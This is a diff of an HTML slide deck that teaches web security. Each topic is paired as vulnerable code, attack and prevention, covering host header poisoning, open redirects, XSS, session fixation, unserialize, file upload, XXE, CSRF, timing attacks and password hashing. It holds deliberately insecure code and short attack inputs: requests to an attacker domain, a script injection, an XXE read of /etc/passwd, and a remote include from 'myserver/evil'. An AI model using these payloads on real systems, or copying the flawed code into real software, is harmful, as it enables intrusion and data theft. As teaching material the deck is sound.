@@ -632,12 +632,17 @@ pre .xml .cdata {
   </div>
   <div class="slide hidden" id="slide-12">
     <section class="slide-content"><h3 id="host-header-poisoning-vulnerability">Host Header Poisoning Vulnerability</h3>
+<p><strong>Java</strong>:</p>
 <pre><code class="lang-java"><span class="annotation">@RequestMapping</span>(<span class="string">"/reset-password"</span>)
 <span class="keyword">public</span> <span class="keyword">void</span> resetPasswordEmail(HttpServletRequest request, <span class="annotation">@RequestParam</span>(<span class="string">"email"</span>) String email) {
   String resetUrl = request.getRequestURL().toString() + <span class="string">"/new-password"</span>;
   String message = <span class="string">"Please go to "</span> + resetUrl + <span class="string">" and enter a new password"</span>;
   Mail.send(email, message)
 }</code></pre>
+<p><strong>PHP</strong>:</p>
+<pre><code class="lang-php"><span class="variable">$resetUrl</span> = <span class="variable">$_SERVER</span>[<span class="string">'SERVER_NAME'</span>] . <span class="string">"/new-password"</span>;
+<span class="variable">$message</span> = <span class="string">"Please go to "</span> . resetUrl . <span class="string">" and enter a new password"</span>;
+mail(email, message);</code></pre>
 </section>
   </div>
   <div class="slide hidden" id="slide-13">
@@ -655,13 +660,23 @@ pre .xml .cdata {
 <span class="attribute">Host</span>: <span class="string">myattackdomain.com</span></code></pre>
 <pre><code class="lang-http"><span class="request">POST <span class="string">/reset-password</span> HTTP/1.1</span>
 <span class="attribute">Host</span>: <span class="string">valid-domain.com:@myattackdomain.com</span></code></pre>
+</section>
+  </div>
+  <div class="slide hidden" id="slide-14">
+    <section class="slide-content"><h3 id="host-header-poisoning-attack-2">Host Header Poisoning Attack 2</h3>
+<pre><code class="lang-java"><span class="annotation">@RequestMapping</span>(<span class="string">"/reset-password"</span>)
+<span class="keyword">public</span> <span class="keyword">void</span> resetPasswordEmail(HttpServletRequest request, <span class="annotation">@RequestParam</span>(<span class="string">"email"</span>) String email) {
+  String resetUrl = request.getRequestURL().toString() + <span class="string">"/new-password"</span>;
+  String message = <span class="string">"Please go to "</span> + resetUrl + <span class="string">" and enter a new password"</span>;
+  Mail.send(email, message)
+}</code></pre>
 <pre><code class="lang-http"><span class="request">POST <span class="string">/reset-password</span> HTTP/1.1</span>
 <span class="attribute">Host</span>: <span class="string">valid-domain.com</span>
 <span class="attribute">X-Forwarded-Host</span>: <span class="string">myattackdomain.com</span></code></pre>
 <pre><code class="lang-java">String message = <span class="string">"Please go to http://myattackdomain.com/new-password and enter a new password"</span>;</code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-14">
+  <div class="slide hidden" id="slide-15">
     <section class="slide-content"><h3 id="host-header-poisoning-prevention">Host Header Poisoning Prevention</h3>
 <p>Middleware approach:</p>
 <p><strong>Java</strong>:</p>
@@ -681,7 +696,7 @@ validDomains.stream()
 }</code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-15">
+  <div class="slide hidden" id="slide-16">
     <section class="slide-content"><h3 id="cache-poisoning-attack">Cache Poisoning Attack</h3>
 <p><strong>Similar to Host Header Poisoning</strong></p>
 <p>Joomla used to generate HTML templates with absolute URLs:</p>
@@ -690,13 +705,13 @@ Host: cow&quot;onerror=&#39;alert(1)&#39;rel=&#39;stylesheet&#39;</code></pre>
 <pre><code class="lang-xml"><span class="tag">&lt;<span class="title">link</span> <span class="attribute">href</span>=<span class="value">"http://cow"</span><span class="attribute">onerror</span>=<span class="value">'alert(1)'</span><span class="attribute">rel</span>=<span class="value">'stylesheet'</span>/" <span class="attribute">rel</span>=<span class="value">"canonical"</span>/&gt;</span></code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-16">
+  <div class="slide hidden" id="slide-17">
     <section class="slide-content"><h3 id="cache-poisoning-prevention">Cache Poisoning Prevention</h3>
 <p><strong>Depends on your Cache Setup</strong></p>
 <p>More information on <a href="http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html"><a href="http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html">http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html</a></a></p>
 </section>
   </div>
-  <div class="slide hidden" id="slide-17">
+  <div class="slide hidden" id="slide-18">
     <section class="slide-content"><h3 id="unvalidated-redirects-vulnerability">Unvalidated Redirects Vulnerability</h3>
 <pre><code class="lang-java"><span class="annotation">@RequestMapping</span>(<span class="string">"/redirect"</span>)
 <span class="keyword">public</span> <span class="keyword">void</span> redirectTo(<span class="annotation">@RequestParam</span>(<span class="string">"url"</span>) String toUrl) {
@@ -704,7 +719,7 @@ Host: cow&quot;onerror=&#39;alert(1)&#39;rel=&#39;stylesheet&#39;</code></pre>
 }</code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-18">
+  <div class="slide hidden" id="slide-19">
     <section class="slide-content"><h3 id="unvalidated-redirects-attack">Unvalidated Redirects Attack</h3>
 <pre><code class="lang-java"><span class="annotation">@RequestMapping</span>(<span class="string">"/redirect"</span>)
 <span class="keyword">public</span> <span class="keyword">void</span> redirectTo(<span class="annotation">@RequestParam</span>(<span class="string">"url"</span>) String toUrl) {
@@ -715,7 +730,7 @@ Host: cow&quot;onerror=&#39;alert(1)&#39;rel=&#39;stylesheet&#39;</code></pre>
 <pre><code class="lang-java"><span class="keyword">return</span> <span class="string">"redirect:http://valid-shop.com:@myfakeshop.com"</span>;</code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-19">
+  <div class="slide hidden" id="slide-20">
     <section class="slide-content"><h3 id="unvalidated-redirects-prevention">Unvalidated Redirects Prevention</h3>
 <p><strong>Java</strong>:</p>
 <pre><code class="lang-java"><span class="annotation">@RequestMapping</span>(<span class="string">"/redirect"</span>)
@@ -731,13 +746,13 @@ Host: cow&quot;onerror=&#39;alert(1)&#39;rel=&#39;stylesheet&#39;</code></pre>
 }</code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-20">
+  <div class="slide hidden" id="slide-21">
     <section class="slide-content"><h3 id="clickjacking-attack">Clickjacking Attack</h3>
 <p>Invisible IFrame + CSS magic which redirects clicks to target website</p>
 <p><a href="http://www.youtube.com/watch?v=3mk0RySeNsU"><img src="http://img.youtube.com/vi/3mk0RySeNsU/0.jpg" alt="IMAGE ALT TEXT HERE"></a></p>
 </section>
   </div>
-  <div class="slide hidden" id="slide-21">
+  <div class="slide hidden" id="slide-22">
     <section class="slide-content"><h3 id="clickjacking-prevention">Clickjacking Prevention</h3>
 <p>Middleware approach, more options (<strong>DENY</strong>, <strong>SAMEORIGIN</strong>, <strong>ALLOW-FROM uri</strong>)</p>
 <p><strong>Java</strong>:</p>
@@ -747,7 +762,7 @@ response.setHeader(<span class="string">'X-Frame-Options'</span>, <span class="s
 <pre><code class="lang-php">header(<span class="string">'X-Frame-Options: DENY'</span>)</code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-22">
+  <div class="slide hidden" id="slide-23">
     <section class="slide-content"><h3 id="xss-vulnerability">XSS Vulnerability</h3>
 <p>PHP examples this time (I&#39;m not that familiar with JSP)</p>
 <pre><code class="lang-php">&lt;input type=<span class="string">"text"</span> value=<span class="string">"&lt;?php echo $accountId ?&gt;"</span>/&gt;</code></pre>
@@ -756,7 +771,7 @@ response.setHeader(<span class="string">'X-Frame-Options'</span>, <span class="s
 <pre><code class="lang-php">&lt;<span class="preprocessor">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$accountId</span> <span class="preprocessor">?&gt;</span>&gt;</code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-23">
+  <div class="slide hidden" id="slide-24">
     <section class="slide-content"><h3 id="xss-attack">XSS Attack</h3>
 <p><strong>$accountId = &quot;\&quot; /&gt; &lt;script&gt;alert(&#39;hi&#39;)&lt;/script&gt;&lt;img src=\&quot;&quot;</strong></p>
 <pre><code class="lang-php">&lt;input type=<span class="string">"text"</span> value=<span class="string">""</span> /&gt; &lt;script&gt;alert(<span class="string">'hi'</span>)&lt;/script&gt;&lt;img src=<span class="string">""</span>/&gt;</code></pre>
@@ -768,7 +783,7 @@ response.setHeader(<span class="string">'X-Frame-Options'</span>, <span class="s
 <pre><code class="lang-php">&lt;a&gt;&lt;script&gt;alert(<span class="string">'hi'</span>)&lt;/script&gt;</code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-24">
+  <div class="slide hidden" id="slide-25">
     <section class="slide-content"><h3 id="lesser-known-xss-vulnerabilities">Lesser Known XSS Vulnerabilities</h3>
 <p><strong>href</strong>, <strong>src</strong>, <strong>style</strong> and <strong>&lt;style&gt;</strong> allow javascript:alert(&#39;hi&#39;)
 <strong>SVG</strong> allows JavaScript</p>
@@ -782,7 +797,7 @@ response.setHeader(<span class="string">'X-Frame-Options'</span>, <span class="s
 <pre><code class="lang-javascript">$(<span class="string">'&lt;a&gt;'</span>).html(response);  <span class="comment">// use text() instead</span></code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-25">
+  <div class="slide hidden" id="slide-26">
     <section class="slide-content"><h3 id="xss-prevention">XSS Prevention</h3>
 <ul>
 <li><strong>Content-Type: application/json; charset=utf-8</strong> for JSON responses</li>
@@ -797,7 +812,7 @@ response.setHeader(<span class="string">'X-Frame-Options'</span>, <span class="s
 </ul>
 </section>
   </div>
-  <div class="slide hidden" id="slide-26">
+  <div class="slide hidden" id="slide-27">
     <section class="slide-content"><h3 id="session-hijacking-vulnerability">Session Hijacking Vulnerability</h3>
 <ul>
 <li>Ever seen these URLs: <strong>/some-url?SESSION_ID=1234kj123k12323</strong> ?</li>
@@ -806,7 +821,7 @@ response.setHeader(<span class="string">'X-Frame-Options'</span>, <span class="s
 </ul>
 </section>
   </div>
-  <div class="slide hidden" id="slide-27">
+  <div class="slide hidden" id="slide-28">
     <section class="slide-content"><h3 id="session-hijacking-attack">Session Hijacking Attack</h3>
 <p>Generate url with your session id and send it to the victim:</p>
 <p><strong><a href="https://myshop.com/login?SESSION_ID=1234kj123k12323">https://myshop.com/login?SESSION_ID=1234kj123k12323</a></strong></p>
@@ -815,7 +830,7 @@ response.setHeader(<span class="string">'X-Frame-Options'</span>, <span class="s
 <p>If HSTS is not present the attacker can use <a href="https://www.owasp.org/index.php/HTTP_Strict_Transport_Security#Threats">MITM for HTTP redirects</a></p>
 </section>
   </div>
-  <div class="slide hidden" id="slide-28">
+  <div class="slide hidden" id="slide-29">
     <section class="slide-content"><h3 id="session-hijacking-prevention">Session Hijacking Prevention</h3>
 <ul>
 <li>Session ID should have enough entropy to prevent guessing</li>
@@ -829,7 +844,7 @@ response.setHeader(<span class="string">'X-Frame-Options'</span>, <span class="s
 <p>More on <a href="https://www.owasp.org/index.php/Session_Management_Cheat_Sheet"><a href="https://www.owasp.org/index.php/Session_Management_Cheat_Sheet">https://www.owasp.org/index.php/Session_Management_Cheat_Sheet</a></a></p>
 </section>
   </div>
-  <div class="slide hidden" id="slide-29">
+  <div class="slide hidden" id="slide-30">
     <section class="slide-content"><h3 id="unserialize-vulnerability">Unserialize Vulnerability</h3>
 <pre><code class="lang-php">&lt;?php
 class Command {
@@ -842,7 +857,7 @@ $commandClass = unserialize($_POST['command']);
 $command-&gt;getName();</code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-30">
+  <div class="slide hidden" id="slide-31">
     <section class="slide-content"><h3 id="unserialize-attack">Unserialize Attack</h3>
 <p>Instantiate another class with values which are used in __destruct and __wakeup!</p>
 <p>Any Framework? Zend? -&gt; upload arbitrary files, execute and include anything</p>
@@ -850,12 +865,12 @@ $command-&gt;getName();</code></pre>
 <p><a href="https://statuscode.ch/2015/02/diving-into-egroupware/">More information</a></p>
 </section>
   </div>
-  <div class="slide hidden" id="slide-31">
+  <div class="slide hidden" id="slide-32">
     <section class="slide-content"><h3 id="unserialize-prevention">Unserialize Prevention</h3>
 <p><strong>DO NOT UNSERIALIZE USER INPUT</strong></p>
 </section>
   </div>
-  <div class="slide hidden" id="slide-32">
+  <div class="slide hidden" id="slide-33">
     <section class="slide-content"><h3 id="file-upload-vulnerability">File Upload Vulnerability</h3>
 <p>Facepalm ahead</p>
 <pre><code class="lang-php"><span class="keyword">if</span>(preg_match(<span class="string">'~^[a-z_\.0-9]+\.(jp[e]?g|png|gif)$~i'</span>, <span class="variable">$filename</span>)) {
@@ -872,7 +887,7 @@ $command-&gt;getName();</code></pre>
 }</code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-33">
+  <div class="slide hidden" id="slide-34">
     <section class="slide-content"><h3 id="file-upload-attack">File Upload Attack</h3>
 <pre><code class="lang-php"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">'id'</span>] <span class="string">'.php'</span>);</code></pre>
 <pre><code>GET /?id=myuploaded.php
@@ -888,7 +903,7 @@ GET /?id=http://myserver/evil</code></pre>
 <pre><code class="lang-php"><span class="preprocessor">&lt;?php</span> do_something_evil(); __halt_compiler();<span class="comment"></code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-34">
+  <div class="slide hidden" id="slide-35">
     <section class="slide-content"><h3 id="file-upload-attack-2">File Upload Attack 2</h3>
 <pre><code class="lang-php"><span class="keyword">if</span> (in_array(<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"type"</span>], [<span class="string">"image/gif"</span>, <span class="string">"image/png"</span>])) {
     <span class="variable">$destination</span> = <span class="string">"uploads/"</span> . <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"name"</span>];
@@ -906,7 +921,7 @@ GET /?id=http://myserver/evil</code></pre>
 <p>Filename: ../../unsafe/directory/myfile.php</p>
 </section>
   </div>
-  <div class="slide hidden" id="slide-35">
+  <div class="slide hidden" id="slide-36">
     <section class="slide-content"><h3 id="file-upload-attack-3">File Upload Attack 3</h3>
 <p>Apache feature: <a href="https://www.acunetix.com/websitesecurity/upload-forms-threat/">Double Extensions</a> ❀(<em>´◡`</em>)❀</p>
 <blockquote>
@@ -916,7 +931,7 @@ GET /?id=http://myserver/evil</code></pre>
 <p>Chrome + IE sniffing: Chrome/IE try to find out the mimetype by parsing the file -&gt; execute code from file.txt</p>
 </section>
   </div>
-  <div class="slide hidden" id="slide-36">
+  <div class="slide hidden" id="slide-37">
     <section class="slide-content"><h3 id="file-upload-prevention">File Upload Prevention</h3>
 <ul>
 <li>Use a separate static content server and domain</li>
@@ -934,7 +949,7 @@ GET /?id=http://myserver/evil</code></pre>
 </ul>
 </section>
   </div>
-  <div class="slide hidden" id="slide-37">
+  <div class="slide hidden" id="slide-38">
     <section class="slide-content"><h3 id="xxe-vulnerability">XXE Vulnerability</h3>
 <p><strong>Java</strong>:</p>
 <pre><code class="lang-java">DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
@@ -945,7 +960,7 @@ Document doc = dBuilder.parse(userSuppliedXml);</code></pre>
 <span class="keyword">echo</span> <span class="variable">$dom</span>-&gt;saveXml();</code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-38">
+  <div class="slide hidden" id="slide-39">
     <section class="slide-content"><h3 id="xxe-attack">XXE Attack</h3>
 <pre><code class="lang-xml"><span class="pi">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
 <span class="doctype">&lt;!DOCTYPE foo [  
@@ -953,7 +968,7 @@ Document doc = dBuilder.parse(userSuppliedXml);</code></pre>
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span><span class="tag">&lt;<span class="title">foo</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="title">foo</span>&gt;</span></code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-39">
+  <div class="slide hidden" id="slide-40">
     <section class="slide-content"><h3 id="xxe-prevention">XXE Prevention</h3>
 <ul>
 <li>Disable XML External Entity Processing!</li>
@@ -971,7 +986,7 @@ libxml_disable_entity_loader(<span class="keyword">false</span>);
 <p><strong>libxml_disable_entity_loader</strong> not threadsafe on php-fpm and  PHP &lt;5.6), use <a href="https://github.com/zendframework/ZendXml">ZendXML</a></p>
 </section>
   </div>
-  <div class="slide hidden" id="slide-40">
+  <div class="slide hidden" id="slide-41">
     <section class="slide-content"><h3 id="csrf-vulnerability">CSRF Vulnerability</h3>
 <p><strong>Java</strong>:</p>
 <pre><code class="lang-java"><span class="annotation">@RequestMapping</span>(<span class="string">"/delete-user"</span>)
@@ -986,7 +1001,7 @@ libxml_disable_entity_loader(<span class="keyword">false</span>);
 }</code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-41">
+  <div class="slide hidden" id="slide-42">
     <section class="slide-content"><h3 id="csrf-attack">CSRF Attack</h3>
 <p>Attack via hidden form, include it on a page the user surfs to, e.g. google ads :)</p>
 <pre><code class="lang-xml"><span class="tag">&lt;<span class="title">form</span> <span class="attribute">action</span>=<span class="value">"https://myshop.com/delete-user"</span> <span class="attribute">method</span>=<span class="value">"post"</span>&gt;</span>
@@ -997,7 +1012,7 @@ libxml_disable_entity_loader(<span class="keyword">false</span>);
 </span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-42">
+  <div class="slide hidden" id="slide-43">
     <section class="slide-content"><h3 id="csrf-prevention">CSRF Prevention</h3>
 <p>Generate a token with valid timespan and pass it to client (NO COOKIE!!!), validate token for each request</p>
 <p>Spring: CSRF enforced by default since Spring Security 4.0</p>
@@ -1007,7 +1022,7 @@ libxml_disable_entity_loader(<span class="keyword">false</span>);
 <p>Beware of <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS#Access-Control-Allow-Credentials">CORS</a> with credentials enabled or CSRF all of your API!</p>
 </section>
   </div>
-  <div class="slide hidden" id="slide-43">
+  <div class="slide hidden" id="slide-44">
     <section class="slide-content"><h3 id="timing-attack-vulnerabilities">Timing Attack Vulnerabilities</h3>
 <p><strong>Java:</strong></p>
 <pre><code class="lang-java"><span class="annotation">@RequestMapping</span>(<span class="string">"/authenticate"</span>)
@@ -1022,7 +1037,7 @@ libxml_disable_entity_loader(<span class="keyword">false</span>);
 }</code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-44">
+  <div class="slide hidden" id="slide-45">
     <section class="slide-content"><h3 id="timing-attack">Timing Attack</h3>
 <pre><code class="lang-php"><span class="function"><span class="keyword">function</span> <span class="title">isStringEqual</span><span class="params">(<span class="variable">$a</span>, <span class="variable">$b</span>)</span> {</span>
   <span class="keyword">if</span> (strlen(<span class="variable">$a</span>) !== strlen(<span class="variable">$b</span>)) {
@@ -1039,7 +1054,7 @@ libxml_disable_entity_loader(<span class="keyword">false</span>);
 }</code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-45">
+  <div class="slide hidden" id="slide-46">
     <section class="slide-content"><h3 id="timing-attack-prevention">Timing Attack Prevention</h3>
 <p><strong>Constant time string compare algorithms!</strong></p>
 <p><strong>Java:</strong></p>
@@ -1053,7 +1068,7 @@ libxml_disable_entity_loader(<span class="keyword">false</span>);
 }</code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-46">
+  <div class="slide hidden" id="slide-47">
     <section class="slide-content"><h3 id="password-hashing-vulnerability">Password Hashing Vulnerability</h3>
 <p><strong>Java</strong>:</p>
 <pre><code class="lang-java">String password = <span class="string">"mypass"</span>;
@@ -1063,12 +1078,12 @@ String hashedPassword = hash(password);</code></pre>
 <span class="variable">$hashedPassword</span> = md5(<span class="variable">$password</span>);</code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-47">
+  <div class="slide hidden" id="slide-48">
     <section class="slide-content"><h3 id="passwort-hashing-attack">Passwort Hashing Attack</h3>
 <p>Rainbow Tables, nuf said</p>
 </section>
   </div>
-  <div class="slide hidden" id="slide-48">
+  <div class="slide hidden" id="slide-49">
     <section class="slide-content"><h3 id="passwort-hashing-attack-prevention">Passwort Hashing Attack Prevention</h3>
 <p><strong>bcrypt!</strong></p>
 <p><strong>Java</strong>:</p>
@@ -1083,7 +1098,7 @@ String hashedPassword = BCrypt.hashpw(password, global_salt + salt);</code></pre
 }</code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-49">
+  <div class="slide hidden" id="slide-50">
     <section class="slide-content"><h3 id="resources">Resources</h3>
 <ul>
 <li><a href="https://www.owasp.org/index.php/Top_10_2013-Top_10">OWASP Top 10</a></li>
